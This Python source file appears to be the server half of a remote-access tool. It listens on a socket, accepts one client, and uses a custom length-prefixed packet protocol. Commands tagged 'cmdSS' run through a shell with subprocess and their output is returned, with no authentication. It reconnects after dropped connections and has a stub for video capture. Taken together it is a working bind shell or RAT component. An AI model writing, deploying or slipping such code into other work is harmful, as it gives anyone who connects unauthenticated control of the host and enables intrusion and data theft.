import subprocess
import socket, sys
import struct, math
from threading import Thread
import socket

PACKET_SIZE = 1024

def connectSocket(HOST, PORT, debug: bool = False) -> socket:
    try:
        sckt = socket.socket(socket.AF_INET)
        if debug: 
            print('[+] Server Started')
            print('[+] Listening For Client Connection ...')
        sckt.bind((HOST, PORT))
        sckt.listen(1)
        client, client_addr = sckt.accept()
        if debug:
            print(f'[+] {client_addr} Client connected to the server')   
        return client
    except (Exception): 
        return

def sendPackets(sckt: socket, dataToSend: bytearray, debug: bool, dataType: int):
    try:
        nOfPacketsToSend = math.ceil(len(dataToSend) / PACKET_SIZE)
        bytesSent = 0
        
        for i in range(nOfPacketsToSend):
            packetHeaderLength = min(PACKET_SIZE, len(dataToSend)-bytesSent).to_bytes(4, "big")
            packetHeaderPackets = (nOfPacketsToSend-(i+1)).to_bytes(1, "big")
            packetPayload = dataToSend[i*PACKET_SIZE:(i*PACKET_SIZE)+min(PACKET_SIZE, len(dataToSend)-bytesSent)]
            packetDataType = dataType.to_bytes(1, "big")
            packet = packetHeaderLength + packetHeaderPackets + packetDataType + packetPayload
            bytesSent += min(PACKET_SIZE, len(dataToSend)-bytesSent)

            sckt.sendall(packet)
            if debug:
                print("packet: ", packetHeaderLength, packetHeaderPackets, packetPayload)
    except (Exception):
        return

def recvAll(sckt: socket, n: int) -> bytearray:
    try:
        dataReceived = sckt.recv(n)
        while (len(dataReceived) < n):
            dataReceived += sckt.recv(n-len(dataReceived))
        return dataReceived
    except (Exception):
        return b'EXIT0x02'

def recvPackets(sckt: socket, debug: bool = False) -> bytearray:
    try:
        dataReceived = b""
        packetHeader = recvAll(sckt, 6)

        packetLength = struct.unpack("i", packetHeader[:4])[0]
        nOfPacketsLeft = packetHeader[4]
        payload = recvAll(sckt, packetLength)
        dataReceived += (payload)

        if debug:
            print("payload: ", dataReceived)
        
        if packetHeader[5] == 0x63:
            while nOfPacketsLeft > 0:
                packetHeader = recvAll(sckt, 6)
                if not packetHeader:
                    return b"EXIT0x02"
                packetLength = struct.unpack("i", packetHeader[:4])[0]
                nOfPacketsLeft = packetHeader[4]
                payload = recvAll(sckt, packetLength) 
                dataReceived += (payload)
            
            dataReceived = b"cmdSS" + dataReceived
        
        return dataReceived
    except:
        return b"EXIT0x02"



def comunicazione(HOST, PORT, debug: bool = False):
    clientSocket = connectSocket(HOST, PORT, True)
    while 1:
        command = recvPackets(clientSocket).decode()

        # DEBUG
        if debug and not command == "":
            print("command: ", command)

        if command == "EXIT0x01":
            sys.exit(0)
        if command == "EXIT0x02":
            clientSocket = connectSocket(HOST, PORT, True)      

        if "cmdSS" in command:
            output = subprocess.run(command.replace("cmdSS", ""), shell=True, capture_output=True)
            sendPackets(clientSocket, output.stdout, True, 99)
            # DEBUG
            if debug and not output.stdout == "":
                print(output.stdout)

        if "videoSS" in command:
            pass



